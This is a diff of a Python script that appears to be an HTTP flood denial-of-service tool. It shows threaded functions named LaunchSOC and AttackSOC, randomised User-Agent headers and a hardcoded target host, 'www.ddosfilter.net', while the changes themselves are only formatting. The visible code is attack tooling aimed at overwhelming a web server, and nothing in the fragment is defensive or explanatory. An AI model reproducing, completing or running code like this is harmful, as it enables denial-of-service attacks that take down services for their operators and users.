@@ -9,6 +9,7 @@ rs = 0
 closed = 0
 red = 255, 0, 0
 
+
 def LaunchSOC(th):
     req = "GET " + '/' + " HTTP/1.1\r\nHost: " + host + "\r\n"
     req += "User-Agent: " + random.choice(ua) + "\r\n"
@@ -19,7 +20,7 @@ def LaunchSOC(th):
         try:
             thd = threading.Thread(target=AttackSOC, args=(req,))
             thd.start()
-            print(""+ Fore.LIGHTBLACK_EX + thd.name)
+            print("" + Fore.LIGHTBLACK_EX + thd.name)
         except:
             pass
 
@@ -43,7 +44,7 @@ def AttackSOC(req):
 
 
 if __name__ == '__main__':
-    #host = input("HTTP Host: ")
+    # host = input("HTTP Host: ")
     host = 'www.ddosfilter.net'
     th = int(input("Threads: "))
     ua = open('./ua.txt', 'r').read().split('\n')
